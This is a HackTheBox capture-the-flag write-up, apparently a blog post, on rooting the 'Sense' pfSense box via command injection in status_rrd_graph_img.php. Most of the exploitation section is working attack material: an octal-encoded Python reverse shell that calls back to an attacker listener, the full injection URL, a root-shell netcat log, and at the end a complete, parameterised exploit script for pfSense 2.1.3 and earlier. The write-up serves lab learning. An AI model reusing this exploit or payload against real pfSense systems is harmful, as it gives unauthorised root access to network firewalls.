---
layout: post
title: HackTheBox - Sense Writeup
tags: [hackthebox]
---

Sense is kind of mixed box for me. I wasn't particularly fond of the long brute forcing fishing for a file, but getting code execution was pretty interesting for the exploit. I also wrote up a python script to fully automate the exploitation once you have valid credentials (see at the end of the writeup).

![sense](/img/sense.png)

## Enumeration


```
root@kali:~/htb/sense# nmap -sV 10.10.10.60

Starting Nmap 7.50 ( https://nmap.org )
Nmap scan report for 10.10.10.60
Host is up (0.10s latency).
Not shown: 998 filtered ports
PORT    STATE SERVICE  VERSION
80/tcp  open  http     lighttpd 1.4.35
443/tcp open  ssl/http lighttpd 1.4.35
```

Opening a browser we see a login for PFSense.
![LOGIN](/img/sense-login.png)

After trying some default username and passwords I decide to move on. Brute forcing a firewall login doesn't seem to be the most sensible thing here.

Let's fire up gobuster and see if we can find any other directories or files.

```
root@kali:~/htb/sense# gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u https://10.10.10.60 -x php,txt,cnf,conf

Gobuster v1.2                OJ Reeves (@TheColonial)
=====================================================
[+] Mode         : dir
[+] Url/Domain   : https://10.10.10.60/
[+] Threads      : 10
[+] Wordlist     : /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Status codes : 301,302,307,200,204
[+] Extensions   : .php,.txt,.cnf,.conf
=====================================================
/index.php (Status: 200)
/help.php (Status: 200)
/themes (Status: 301)
/stats.php (Status: 200)
/css (Status: 301)
/edit.php (Status: 200)
/includes (Status: 301)
/license.php (Status: 200)
/system.php (Status: 200)
/status.php (Status: 200)
/javascript (Status: 301)
/changelog.txt (Status: 200)
/classes (Status: 301)
/exec.php (Status: 200)
/widgets (Status: 301)
/graph.php (Status: 200)
/tree (Status: 301)
/wizard.php (Status: 200)
/shortcuts (Status: 301)
/pkg.php (Status: 200)
/installer (Status: 301)
/wizards (Status: 301)
/xmlrpc.php (Status: 200)
/reboot.php (Status: 200)
/interfaces.php (Status: 200)
/csrf (Status: 200)
/system-users.txt (Status: 200)
```

After running for a very long time we finally have a couple of interesting files to look at, `changelog.txt` and `system-users.txt`.

![CHANGELOG](/img/sense-changelog.png)

![USERS](/img/sense-users.png)

Looks like we have some credentials. The username `rohit` works along with the pfSense default password of `pfsense`. We're presented with pfSense dashboard showing a version of 2.1.3.

![VERSION](/img/sense-version.png)

## Exploitation

Based off the build date and the information we saw in the changelog file we know we at least have one vulnerability to work with. After a quick search online we find something applicable.

<https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/>

Our current user doesn't have many privileges so we're limited to looking for something we can manipulate in the Status submenu. Luckily we do have access to `status_rrd_graph_img.php` so we can exploit it using the technique in the article.

Let's test command injection by running the `id` command and outputting to a txt file.

`https://10.10.10.60/status_rrd_graph_img.php?database=queues;cd+..;cd+..;cd+..;cd+usr;cd+local;cd+www;id%3Ecmd.txt`

As stated in the article we're able to inject shell commands after `database=queues;`. The limitation being that forward slashes aren't going to work. Since we want to view the output of our command we first have to change directories out of the current directory of `/var/db/rrd/` and into `/usr/local/www/`. Then we can run `id` and pipe the output to cmd.txt.

![CMD](/img/sense-cmd.png)

And we can see we have command execution as root! Now for the tricky part of getting a reverse shell. My first thought was base64 encoding to work around the forward slash issue, but I ran into a problem. Through my testing I also was not able to passthrough any dashes for command line options which means we can't use `base64 -d` to decode any input. So what we can do is use octal encoding, then use `printf` to decode it, and then pipe the output to be executed.

To faciliate generating the octal payload I wrote a quick python script to make the output compatible for `printf`.

```python
#!/usr/bin/env python3

command = "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.10.14.10',443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i']);'"

payload = ""

for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

print(payload)
```

A python reverse shell is used as our command, the script adds a backslash in front of each octal encoded character and also strips any leading zeros so that the formatting is all correct.

```
root@kali:~/htb/sense# ./octal.py
\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\60\42\54\64\64\63\51\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47
```

To verify our payload we can test with `printf`.

```
root@kali:~/htb/sense# printf '\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\60\42\54\64\64\63\51\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47'

python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.10",443));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
``` 
As we can see it decodes correctly. Now all we need to do is inject into the URL and pipe the output to `sh` to achieve a shell.

Start a netcat listener and browse to our crafted URL:

`https://10.10.10.60/status_rrd_graph_img.php?database=queues;printf+%27\160\171\164\150\157\156\40\55\143\40\47\151\155\160\157\162\164\40\163\157\143\153\145\164\54\163\165\142\160\162\157\143\145\163\163\54\157\163\73\163\75\163\157\143\153\145\164\56\163\157\143\153\145\164\50\163\157\143\153\145\164\56\101\106\137\111\116\105\124\54\163\157\143\153\145\164\56\123\117\103\113\137\123\124\122\105\101\115\51\73\163\56\143\157\156\156\145\143\164\50\50\42\61\60\56\61\60\56\61\64\56\61\60\42\54\64\64\63\51\51\73\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\60\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\61\51\73\40\157\163\56\144\165\160\62\50\163\56\146\151\154\145\156\157\50\51\54\62\51\73\160\75\163\165\142\160\162\157\143\145\163\163\56\143\141\154\154\50\133\42\57\142\151\156\57\163\150\42\54\42\55\151\42\135\51\73\47%27|sh`


```
root@kali:~/htb/sense# nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.10] from (UNKNOWN) [10.10.10.60] 47018
sh: can't access tty; job control turned off
# id && hostname
uid=0(root) gid=0(wheel) groups=0(wheel)
pfSense.localdomain
```

And now we are root!

## Fully Scripted Exploit

I decided to try to build on the octal encoding script and fully script out the exploit. All you need to do is start a netcat listener and provide the required arguments to return a reverse shell.
I'm sure there are much better ways to do a lot of this but I'm still learning. It's also posted on Exploit-DB. Before I submitted to Exploit-DB I forgot to add some logic for when running the script without parameters so it will throw a TypeError. You can ignore that and just feed in the parameters correctly and it works fine. I've added the updated script below that will print the help instead when running the script without args.

<https://www.exploit-db.com/exploits/43560/>

```python
#!/usr/bin/env python3

import argparse
import requests
import sys
import urllib
import urllib3
import collections

'''
pfSense <= 2.1.3 status_rrd_graph_img.php Command Injection. 
This script will return a reverse shell on specified listener address and port.
Ensure you have started a listener to catch the shell before running!
'''

parser = argparse.ArgumentParser()
parser.add_argument("--rhost", help = "Remote Host")
parser.add_argument('--lhost', help = 'Local Host listener')
parser.add_argument('--lport', help = 'Local Port listener')
parser.add_argument("--username", help = "pfsense Username")
parser.add_argument("--password", help = "pfsense Password")

if len(sys.argv[1:]) == 0:
    parser.print_help()
    parser.exit()

args = parser.parse_args()

rhost = args.rhost
lhost = args.lhost
lport = args.lport
username = args.username
password = args.password


# command to be converted into octal
command = """
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("%s",%s));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1); 
os.dup2(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
""" % (lhost, lport)


payload = ""

# encode payload in octal
for char in command:
	payload += ("\\" + oct(ord(char)).lstrip("0o"))

login_url = 'https://' + rhost + '/index.php'
exploit_url = "https://" + rhost + "/status_rrd_graph_img.php?database=queues;"+"printf+" + "'" + payload + "'|sh"

headers = [
	('User-Agent','Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0'), 
	('Accept', 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'),
	('Accept-Language', 'en-US,en;q=0.5'),
	('Referer',login_url),
	('Connection', 'close'),
	('Upgrade-Insecure-Requests', '1'),
	('Content-Type', 'application/x-www-form-urlencoded')
]

# probably not necessary but did it anyways
headers = collections.OrderedDict(headers)

# Disable insecure https connection warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

client = requests.session()

# try to get the login page and grab the csrf token
try:
	login_page = client.get(login_url, verify=False)
	
	index = login_page.text.find("csrfMagicToken")
	csrf_token = login_page.text[index:index+128].split('"')[-1]
	
except:
	print("Could not connect to host!")
	exit()

# format login variables and data
if csrf_token:
	print("CSRF token obtained")
	login_data = [('__csrf_magic',csrf_token), ('usernamefld',username), ('passwordfld',password), ('login','Login') ]
	login_data = collections.OrderedDict(login_data)
	encoded_data = urllib.parse.urlencode(login_data)

# POST login request with data, cookies and header
	login_request = client.post(login_url, data=encoded_data, cookies=client.cookies, headers=headers)
else:
	print("No CSRF token!")
	exit()

if login_request.status_code == 200:
		print("Running exploit...")
# make GET request to vulnerable url with payload. Probably a better way to do this but if the request times out then most likely you have caught the shell
		try:
			exploit_request = client.get(exploit_url, cookies=client.cookies, headers=headers, timeout=5)
			if exploit_request.status_code:
				print("Error running exploit")				
		except:
			print("Exploit completed")
		
```